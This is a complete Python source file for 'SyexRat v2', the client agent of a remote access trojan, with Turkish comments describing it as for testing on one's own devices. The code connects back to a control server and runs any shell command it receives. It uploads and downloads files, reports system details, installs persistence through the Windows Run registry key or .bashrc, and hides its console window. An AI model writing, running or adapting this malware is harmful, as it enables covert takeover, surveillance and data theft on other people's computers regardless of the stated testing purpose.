#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SyexRat v2 - Agent / Client (syexrat_Start.py)
Kendi cihazlariniz arasindaki test icin.
Kurulum: pip install cryptography
"""

import socket
import subprocess
import os
import sys
import platform
import time
import base64
import json
import random
import struct
import hashlib

from cryptography.fernet import Fernet

# ============ AYARLAR ============
SERVER_HOST = "192.168.32.224"   # <-- kontrol cihazinizin IP'si
SERVER_PORT = 4444
BASE_DELAY = 5
MAX_DELAY = 60
SECRET = "SyexSecretKey2026"     # Control ile AYNI olmali
# =================================

fernet = Fernet(base64.urlsafe_b64encode(
    hashlib.sha256(SECRET.encode()).digest()))


def enc(data: bytes) -> bytes:
    ct = fernet.encrypt(data)
    return struct.pack(">I", len(ct)) + ct


def recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(min(n - len(buf), 65536))
        if not chunk:
            raise ConnectionError("baglanti kesildi")
        buf += chunk
    return buf


def dec(sock) -> bytes:
    length = struct.unpack(">I", recv_exact(sock, 4))[0]
    return fernet.decrypt(recv_exact(sock, length))


def get_sysinfo() -> dict:
    return {
        "os": platform.system(),
        "os_version": platform.release(),
        "hostname": platform.node(),
        "user": os.getenv("USERNAME") or os.getenv("USER") or "termux",
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    }


def run_command(cmd: str) -> bytes:
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        out = r.stdout + r.stderr
        return out if out else b"[+] tamamlandi (cikti yok)."
    except subprocess.TimeoutExpired:
        return b"[-] zaman asimi (120s)."
    except Exception as e:
        return f"[-] {e}".encode()


def send_file(sock, path: str) -> str:
    """Ajan -> Kontrol dosya gonderme (download komutu)"""
    try:
        path = os.path.abspath(path)
        if not os.path.isfile(path):
            sock.sendall(enc(b"__CANCEL__"))
            return f"[-] dosya yok: {path}"
        size = os.path.getsize(path)
        meta = json.dumps({"file": os.path.basename(path), "size": size}).encode()
        sock.sendall(enc(b"__FILE__" + meta))
        sent = 0
        with open(path, "rb") as f:
            while sent < size:
                chunk = f.read(65536)
                if not chunk:
                    break
                sock.sendall(enc(chunk))
                sent += len(chunk)
        return f"[+] gonderildi: {path} ({sent}B)"
    except Exception as e:
        return f"[-] {e}"


def recv_file(sock) -> str:
    """Kontrol -> Ajan dosya alma (upload komutu)"""
    try:
        raw = dec(sock)
        if raw == b"__CANCEL__":
            return "[-] kaynak dosya bulunamadi"
        meta = json.loads(raw[8:].decode())
        received = 0
        with open(meta["file"], "wb") as f:
            while received < meta["size"]:
                chunk = dec(sock)
                f.write(chunk)
                received += len(chunk)
        return f"[+] alindi: {meta['file']} ({received}B)"
    except Exception as e:
        return f"[-] {e}"


def do_persist() -> str:
    """Kendi cihazinda otomatik baslatma (test amacli)"""
    try:
        home = os.path.expanduser("~")
        src = os.path.abspath(__file__)
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SyexRat", 0, winreg.REG_SZ,
                              f'pythonw "{src}"')
            winreg.CloseKey(key)
            return "[+] Windows persistence: HKCU Run anahtari"
        else:
            # Termux / Linux
            dst = os.path.join(home, ".syexrat.py")
            with open(src, "rb") as a, open(dst, "wb") as b:
                b.write(a.read())
            bashrc = os.path.join(home, ".bashrc")
            with open(bashrc, "a") as f:
                f.write(f"nohup python {dst} >/dev/null 2>&1 &\n")
            return f"[+] persistence: {bashrc} + {dst}"
    except Exception as e:
        return f"[-] persistence hatasi: {e}"


def worker(sock):
    while True:
        cmd = dec(sock).decode("utf-8", errors="replace").strip()
        if not cmd:
            continue

        if cmd == "exit":
            sock.close()
            return

        elif cmd == "sysinfo":
            i = get_sysinfo()
            sock.sendall(enc(
                f"OS: {i['os']} {i['os_version']}\n"
                f"Host: {i['hostname']}\n"
                f"User: {i['user']}\n"
                f"CWD: {i['cwd']}\n"
                f"PID: {i['pid']}".encode()))

        elif cmd == "persist":
            sock.sendall(enc(do_persist().encode()))

        elif cmd.startswith("download "):
            sock.sendall(enc(send_file(sock, cmd[9:].strip()).encode()))

        elif cmd.startswith("upload "):
            sock.sendall(enc(recv_file(sock).encode()))

        elif cmd.startswith("cd "):
            try:
                os.chdir(os.path.expanduser(cmd[3:].strip()))
                sock.sendall(enc(f"[+] CWD: {os.getcwd()}".encode()))
            except OSError as e:
                sock.sendall(enc(f"[-] {e}".encode()))

        else:
            sock.sendall(enc(run_command(cmd)))


def main():
    # Konsol gizleme SADECE Windows'ta; Termux'ta calismaz, cokmez
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

    delay = BASE_DELAY
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            s.sendall(enc(json.dumps(get_sysinfo()).encode()))
            delay = BASE_DELAY
            worker(s)
        except (ConnectionError, socket.error, OSError):
            pass
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass
        time.sleep(delay + random.uniform(0, 2))
        delay = min(delay * 2, MAX_DELAY)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Kullanici tarafindan durduruldu.")
